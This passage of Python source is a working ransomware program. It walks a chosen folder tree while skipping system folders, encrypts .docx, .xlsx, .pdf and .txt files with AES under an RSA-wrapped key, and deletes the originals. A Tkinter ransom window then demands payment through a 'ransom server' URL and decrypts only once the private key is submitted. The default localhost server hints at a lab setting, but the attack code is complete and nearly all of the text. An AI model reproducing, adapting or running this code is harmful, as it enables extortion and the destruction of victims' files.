        self.background_image = tk.PhotoImage(data = SourceImage)
        self.background_label = tk.Label(self.frame_top, bg = 'black', image = self.background_image)
        self.background_label.place(relwidth = 1, relheight = 1)

        self.frame_bottom = tk.Frame(self, bg = 'black')
        self.frame_bottom.place(relx = 0, rely = 0.35, relwidth = .4, relheight = 0.65)
        self.ransom_message = tk.Message(self.frame_bottom, text = ransom_text, font = ('Bold',12), bg = 'black', fg = 'red', justify = 'left', width = 390)
        self.ransom_message.place(relwidth = 1, relheight = 1)

        self.frame_topright = tk.Frame(self, bg = 'black')
        self.frame_topright.place(relx = .47, rely = .01)
        self.pubkey_message = tk.Message(self.frame_topright, width = 520, text = PubkeyText, font = ('arial', 10))
        self.pubkey_message.pack()
        self.pubkey_button = tk.Button(self, text = 'Copy Public Key', command = self.on_button_pubkey)
        self.pubkey_button.place(relx = .47, rely = .24, relwidth = .15, relheight = .05)

        self.frame_bottomright = tk.Frame(self, bg = 'white')
        self.frame_bottomright.place(relx = .47, rely = .31, width = 520, height = 400)
        self.text = tk.Text(self.frame_bottomright, font = ('arial', 10))
        self.text.place(relwidth = 1, relheight = 1)
        self.privkey_button = tk.Button(self, text = 'Submit Private Key', command = self.on_button_privkey)
        self.privkey_button.place(relx = .47, rely = .89, relwidth = .15, relheight = .05)
    def on_button_pubkey(self):
        self.clipboard_clear()
        self.clipboard_append(PubkeyText)
    def on_button_privkey(self):
        PrivkeyText = self.text.get('1.0','end-1c')
        self.key = decrypt_keyfile(PrivkeyText)
        self.destroy() # this destroys the window, but doesn't get out of the loop
#end ransom window

#Randomly generate a key in memory and then save it encrypted with public key.
def encrypt_keyfile():
    charSet = string.ascii_letters + string.digits
    password = ''.join(random.choice(charSet) for i in range(32)).encode()
    key = hashlib.sha256(password).digest()
    iv = ''.join(chr(random.randint(0, 0x7F)) for i in range(16)).encode()
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    TestString = encryptor.encrypt(Checksum.encode())
    with open(password_file, 'wb') as out_file:
        session_key = get_random_bytes(16)
        cipher_rsa = PKCS1_OAEP.new(Pubkey)
        out_file.write(cipher_rsa.encrypt(session_key))
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        data = password + TestString + iv
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)
        out_file.close()
    return (key)

def decrypt_keyfile(PrivkeyText):
    code = 'nooneknows'

    with open(password_file, 'rb') as fobj:
        private_key = RSA.import_key(PrivkeyText, passphrase = code)
        enc_session_key, nonce, tag, ciphertext = [ fobj.read(x)
                                                    for x in (private_key.size_in_bytes(),
                                                    16, 16, -1) ]
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    password = data[0:32]    # Decryption key
    TestString = data[32:48] # Checksum
    iv = data[48:64]         # Initialization vector
    key = hashlib.sha256(password).digest()
    decryptor = AES.new(key, AES.MODE_CBC, iv)
    DecodedTestString = decryptor.decrypt(TestString)
    if DecodedTestString.decode() != Checksum:
        sys.exit()
    else:
        return (key)
#End of keys section


#File functions here.
def get_path_list(PathList, StartPath, NoStrikeList):
    for h in os.walk(StartPath):
        Compare = h[0].split('\\')
        if Compare[1] not in NoStrikeList:
            PathList.append(h[0])
    return PathList

def get_filelist(PathList, ExtensionList, filelist):
    for path in PathList:
        with os.scandir(path) as it:
            for entry in it:
                file_extension = os.path.splitext(entry)
                if file_extension[1].lower() in ExtensionList:
                    filelist.append('{}\\{}'.format(path,entry.name))
    return filelist
#End of file functions

#Crypto functions here
def encrypt_file(key, in_filename, out_filename=None, ChunkSize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        ChunkSize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            ChunkSize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0x7F)) for i in range(16)).encode()
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(ChunkSize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' '.encode() * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

def decrypt_file(key, in_filename, out_filename, ChunkSize):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(ChunkSize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)
#End crypto functions.

def main():
    #initialize values & get arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target',
        help='path to the folder to encrypt, for example, C:\\\\Users\\\\',
        default='C:\\Users\\' + user + '\\Desktop\\RELEASE CANDIDATES\\Source')
    parser.add_argument('-s', '--server',
        help='hostname of ransom server',
        default='localhost')
    parser.add_argument('-p', '--port',
        help='port of ransom server',
        default='8000')

    args = parser.parse_args()
    StartPath = args.target
    ransom_url = 'http://'+args.server+':'+args.port
    ransom_text = 'You have ransomware, it\'s nothing personal. This is a business for us, we don\'t care about you or your data. Your data can be unlocked by paying the ransom. If you pay, no problem, you can trust that we\'ll restore it.\n\nHow to decrypt:\n\n1. Copy the pubkey by pressing button at right.\n2. Navigate to the following link:\n\n{}\n\n3. Follow directions at the link.\n\nTrust me, our technology almost always works as intended. If not, so sorry.\n\nDEAR FRIEND, DON\'T CLOSE THIS WINDOW! DON\'T ATTEMPT RECOVERY WITHOUT FOLLOWING INSTRUCTIONS!!'.format(ransom_url)

    NoStrikeList = ['$Recycle.Bin', 'ProgramData', 'Program Files', 'Program Files (x86)', 'Windows', 'ghost']
    EncryptPaths = []
    EncryptFiles = []
    DecryptPaths = []
    DecryptFiles = []
    out_filename = None
    ChunkSize=24*1024
    app = ransom_window()
    key = 'notakey'

    if os.path.isfile(password_file) is False:
        EncryptExtensions = ['.docx', '.xlsx', '.pdf', '.txt']
        EncryptPaths = get_path_list(EncryptPaths, StartPath, NoStrikeList)
        EncryptFiles = get_filelist(EncryptPaths, EncryptExtensions, EncryptFiles)
        print()
        key = encrypt_keyfile()
        for i in range(len(EncryptFiles)):
            EncryptMe = EncryptFiles[i]
            encrypt_file(key,EncryptMe,out_filename,ChunkSize)
            os.remove(EncryptMe)
        key = 'notakey'

    while key == 'notakey':
        app.mainloop()
        key=app.key
    DecryptExtensions = ['.enc']
    DecryptPaths = get_path_list(DecryptPaths, StartPath, NoStrikeList)
    DecryptFiles = get_filelist(DecryptPaths, DecryptExtensions, DecryptFiles)
    for j in range(len(DecryptFiles)):
        DecryptMe = DecryptFiles[j]
        decrypt_file(key, DecryptMe, out_filename, ChunkSize)
        os.remove(DecryptMe)
    sys.exit()

if __name__ == "__main__":
    main()
